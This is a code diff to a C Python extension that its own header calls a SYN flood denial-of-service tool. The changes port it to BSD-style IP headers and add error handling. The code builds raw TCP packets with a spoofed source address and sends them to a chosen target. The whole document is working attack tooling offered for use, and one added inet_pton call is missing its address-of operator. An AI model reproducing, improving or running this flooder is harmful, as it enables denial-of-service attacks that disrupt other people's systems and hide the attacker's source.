@@ -1,6 +1,7 @@
 /*
     Syn Flood DOS with LINUX sockets, thanks binarytides.com!
 */
+#define __USE_BSD 1 //Set linux headers to use BSD style headers
 #include <stdio.h>
 #include <netinet/tcp.h>   //Provides declarations for tcp header
 #include <netinet/ip.h>    //Provides declarations for ip header
@@ -45,7 +46,7 @@ int s;
 //Datagram to represent the packet
 char datagram[4096];
 //IP header
-struct iphdr *iph = (struct iphdr *) datagram;
+struct ip *iph = (struct ip *) datagram;
 //TCP header
 struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
 struct sockaddr_in sin2;
@@ -55,12 +56,12 @@ static PyObject * synmod_send(PyObject *self, PyObject* args)
 {
     if (sendto (s,      /* our socket */
                 datagram,   /* the buffer containing headers and data */
-                iph->tot_len,    /* total length of our datagram */
+                iph->ip_len,    /* total length of our datagram */
                 0,      /* routing flags, normally always 0 */
                 (struct sockaddr *) &sin2,   /* socket addr, just like in */
                 sizeof (sin2)) < 0)       /* a normal send() */
 
-        printf ("errorn");
+        printf ("error\r\n");
 
     return PyInt_FromLong(42L);
 }
@@ -69,34 +70,57 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
 {
     int src_port, dest_port, ok;
     const char *src_addr, *dest_addr;
+    struct in_addr conv_src_addr, conv_dest_addr;
 
     ok = PyArg_ParseTuple(args, "sisi", &src_addr, &src_port, &dest_addr, &dest_port);
 
+    if(!ok)
+    {
+        printf("Python parsing failed\r\n");
+        return PyInt_FromLong(0L);;
+    }
+
     printf("Using src %s:%i dest %s:%i\r\n", src_addr, src_port, dest_addr, dest_port);
 
+    ok = inet_pton(AF_INET, src_addr, &conv_src_addr);
+
+    if(!ok)
+    {
+        printf("src_addr conversion failed\r\n");
+        return PyInt_FromLong(0L);;
+    }
+
+    ok = inet_pton(AF_INET, dest_addr, conv_dest_addr);
+
+    if(!ok)
+    {
+        printf("dest_addr conversion failed\r\n");
+        return PyInt_FromLong(0L);;
+    }
+
     //Create a raw socket
-    s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
+    s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  
     sin2.sin_family = AF_INET; //dest addr
     sin2.sin_port = htons(dest_port);
-    sin2.sin_addr.s_addr = inet_addr (dest_addr);
+    sin2.sin_addr.s_addr = inet_addr(dest_addr);
  
-    memset (datagram, 0, 4096); /* zero out the buffer */
+    memset(datagram, 0, 4096); /* zero out the buffer */
  
     //Fill in the IP Header
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
-    iph->id = htonl (54321); //Id of this packet
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
-    iph->check = 0;      //Set to 0 before calculating checksum
-    iph->saddr = inet_addr (src_addr);  //Spoof the source ip address
-    iph->daddr = sin2.sin_addr.s_addr;
+    iph->ip_hl = 5;
+    iph->ip_v = 4;
+    iph->ip_tos = 0;
+    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
+    iph->ip_id = htonl(54321); //Id of this packet
+    iph->ip_off = 0;
+    iph->ip_ttl = 255;
+    iph->ip_p = IPPROTO_TCP;
+    iph->ip_sum = 0;      //Set to 0 before calculating checksum
+    iph->ip_src = conv_src_addr;  //Spoof the source ip address
+    iph->ip_dst = conv_dest_addr;
  
-    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
  
     //TCP Header
     tcph->source = htons (src_port);
@@ -131,7 +155,10 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
         int one = 1;
         const int *val = &one;
         if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
-            printf ("Warning: Cannot set HDRINCL!n");
+        {
+            printf ("Warning: Cannot set HDRINCL!\r\n");
+            return PyInt_FromLong(0L);
+        }
     }
 
     return PyInt_FromLong(42L);
